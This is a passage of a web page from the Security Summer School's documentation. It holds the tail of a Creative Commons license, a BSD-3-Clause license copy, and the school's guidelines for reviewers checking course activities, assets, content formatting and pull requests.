</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     For the avoidance of doubt, this Section 6(b) does not affect any
</span></span><span style=display:flex><span>     right the Licensor may have to seek remedies for Your violations
</span></span><span style=display:flex><span>     of this Public License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c. For the avoidance of doubt, the Licensor may also offer the
</span></span><span style=display:flex><span>Licensed Material under separate terms or conditions or stop
</span></span><span style=display:flex><span>distributing the Licensed Material at any time; however, doing so
</span></span><span style=display:flex><span>will not terminate this Public License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>d. Sections 1, 5, 6, 7, and 8 survive termination of this Public
</span></span><span style=display:flex><span>License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Section 7 -- Other Terms and Conditions.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a. The Licensor shall not be bound by any additional or different
</span></span><span style=display:flex><span>terms or conditions communicated by You unless expressly agreed.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b. Any arrangements, understandings, or agreements regarding the
</span></span><span style=display:flex><span>Licensed Material not stated herein are separate from and
</span></span><span style=display:flex><span>independent of the terms and conditions of this Public License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Section 8 -- Interpretation.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a. For the avoidance of doubt, this Public License does not, and
</span></span><span style=display:flex><span>shall not be interpreted to, reduce, limit, restrict, or impose
</span></span><span style=display:flex><span>conditions on any use of the Licensed Material that could lawfully
</span></span><span style=display:flex><span>be made without permission under this Public License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b. To the extent possible, if any provision of this Public License is
</span></span><span style=display:flex><span>deemed unenforceable, it shall be automatically reformed to the
</span></span><span style=display:flex><span>minimum extent necessary to make it enforceable. If the provision
</span></span><span style=display:flex><span>cannot be reformed, it shall be severed from this Public License
</span></span><span style=display:flex><span>without affecting the enforceability of the remaining terms and
</span></span><span style=display:flex><span>conditions.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c. No term or condition of this Public License will be waived and no
</span></span><span style=display:flex><span>failure to comply consented to unless expressly agreed to by the
</span></span><span style=display:flex><span>Licensor.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>d. Nothing in this Public License constitutes or may be interpreted
</span></span><span style=display:flex><span>as a limitation upon, or waiver of, any privileges and immunities
</span></span><span style=display:flex><span>that apply to the Licensor or You, including from the legal
</span></span><span style=display:flex><span>processes of any jurisdiction or authority.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>=======================================================================
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Creative Commons is not a party to its public
</span></span><span style=display:flex><span>licenses. Notwithstanding, Creative Commons may elect to apply one of
</span></span><span style=display:flex><span>its public licenses to material it publishes and in those instances
</span></span><span style=display:flex><span>will be considered the “Licensor.” The text of the Creative Commons
</span></span><span style=display:flex><span>public licenses is dedicated to the public domain under the CC0 Public
</span></span><span style=display:flex><span>Domain Dedication. Except for the limited purpose of indicating that
</span></span><span style=display:flex><span>material is shared under a Creative Commons public license or as
</span></span><span style=display:flex><span>otherwise permitted by the Creative Commons policies published at
</span></span><span style=display:flex><span>creativecommons.org/policies, Creative Commons does not authorize the
</span></span><span style=display:flex><span>use of the trademark &#34;Creative Commons&#34; or any other trademark or logo
</span></span><span style=display:flex><span>of Creative Commons without its prior written consent including,
</span></span><span style=display:flex><span>without limitation, in connection with any unauthorized modifications
</span></span><span style=display:flex><span>to any of its public licenses or any other arrangements,
</span></span><span style=display:flex><span>understandings, or agreements concerning use of licensed material. For
</span></span><span style=display:flex><span>the avoidance of doubt, this paragraph does not form part of the
</span></span><span style=display:flex><span>public licenses.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Creative Commons may be contacted at creativecommons.org.
</span></span></code></pre></div><p>Copy of BSD-3-Clause:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>Copyright 2021 University POLITEHNICA of Bucharest
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Redistribution and use in source and binary forms, with or without
</span></span><span style=display:flex><span>modification, are permitted provided that the following conditions are met:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>1.</span> Redistributions of source code must retain the above copyright notice, this
</span></span><span style=display:flex><span>   list of conditions and the following disclaimer.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>2.</span> Redistributions in binary form must reproduce the above copyright notice,
</span></span><span style=display:flex><span>   this list of conditions and the following disclaimer in the documentation
</span></span><span style=display:flex><span>   and/or other materials provided with the distribution.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>3.</span> Neither the name of the copyright holder nor the names of its contributors
</span></span><span style=display:flex><span>   may be used to endorse or promote products derived from this software
</span></span><span style=display:flex><span>   without specific prior written permission.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &#34;AS IS&#34; AND
</span></span><span style=display:flex><span>ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
</span></span><span style=display:flex><span>WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
</span></span><span style=display:flex><span>DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
</span></span><span style=display:flex><span>FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
</span></span><span style=display:flex><span>DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
</span></span><span style=display:flex><span>SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
</span></span><span style=display:flex><span>CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
</span></span><span style=display:flex><span>OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
</span></span><span style=display:flex><span>OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
</span></span></code></pre></div></div><div class=td-content style=page-break-before:always><h1 id=pg-65ef646d6eed697a7af341ec1cc2f0ce>12 -</h1><h1 id=sss-reviewer-guidelines>SSS Reviewer Guidelines</h1><p>These are recommendations for reviewing contributions to SSS repositories.
Reviewing is important to ensure high quality and consistency of content.
As a reviewer, we trust you will vet contributions and provide constructive suggestions to update them to fit the SSS guidelines.</p><h2 id=activities--challenges>Activities / Challenges</h2><p>Make sure that activities / challenges are of good quality:</p><ul><li>Difficulty is properly set.</li><li>The topic of the activity / challenge is appropriate.</li><li>The provided solution is working.</li><li>Vulnerability and explanations are easy to understand.</li></ul><h2 id=assets>Assets</h2><p>Check if all of them are used and mentioned in the content.
If the assets are not original, make sure their license is compatible with <a href=COPYING.md>ours</a> and that their source is properly cited.
Verify that their names are appropriate and respect the following rules:</p><ul><li>Use dash between words (e.g. <code>image-name.png</code>).</li><li>Use only lowercase ASCII characters.</li></ul><h2 id=content>Content</h2><p>Make sure that the content is of good quality:</p><ul><li>It follows the general structure of a <a href=https://github.com/security-summer-school/template-public/tree/master/session-name-1>session</a>.</li><li>Assets are displayed well.</li><li>Each sentence is on a separate line.</li><li>The content is easy to understand.</li><li>Wording and general spelling are correct.</li><li>Proper formatting is used (such as bold, italic, typewriter formats).</li></ul><h2 id=working-on-pull-requests>Working on Pull Requests</h2><p>You will review contributions as pull requests, following the <a href=https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/reviewing-changes-in-pull-requests/about-pull-request-reviews>PR review guidelines from GitHub</a>.
Contributions must follow the <a href=CONTRIBUTING.md>contributing guidelines</a>.</p><p>Add your review as comments and request for changes to the PR until everything is ready to be approved.
Add any comments regarding one or more explicit lines as review comments and only publish them together when submitting your review.
Do not add each individual suggestion or comment as standalone.
Before approving the PR, make sure that all GitHub Actions tests ended successfully.
Once approved, either you or someone with proper access rights can use <code>Rebase and merge</code> to merge the PR commits and integrate the contribution.</p></div></main></div></div><footer class="bg-dark py-5 row d-print-none"><div class="container-fluid mx-sm-5"><div class=row><div class="col-6 col-sm-4 text-xs-center order-sm-2"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Discord aria-label=Discord><a class=text-white target=_blank rel=noopener href=https://bit.ly/DiscordSecuritySummerSchool aria-label=Discord><i class="fab fa-discord"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Facebook aria-label=Facebook><a class=text-white target=_blank rel=noopener href=https://www.facebook.com/SSSUPB/ aria-label=Facebook><i class="fab fa-facebook"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Youtube aria-label=Youtube><a class=text-white target=_blank rel=noopener href=https://bit.ly/YoutubeSecuritySummerSchool aria-label=Youtube><i class="fab fa-youtube"></i></a></li></ul></div><div class="col-6 col-sm-4 text-right text-xs-center order-sm-3"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=GitHub aria-label=GitHub><a class=text-white target=_blank rel=noopener href=https://github.com/security-summer-school aria-label=GitHub><i class="fab fa-github"></i></a></li></ul></div><div class="col-12 col-sm-4 text-center py-2 order-sm-2"><small class=text-white>&copy; 2023 Open-Source Contributors. All Rights Reserved</small></div></div></div></footer></div><script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.min.js integrity="sha512-UR25UO94eTnCVwjbXozyeVd6ZqpaAE9naiEUBK/A+QDbfSTQFhPGj5lOR6d8tsgbBk84Ggb5A3EkjsOgPRPcKA==" crossorigin=anonymous></script>
<script src=/js/tabpane-persist.js></script>
<script src=/js/main.min.aa9f4c5dae6a98b2c46277f4c56f1673a2b000d1756ce4ffae93784cab25e6d5.js integrity="sha256-qp9MXa5qmLLEYnf0xW8Wc6KwANF1bOT/rpN4TKsl5tU=" crossorigin=anonymous></script></body></html>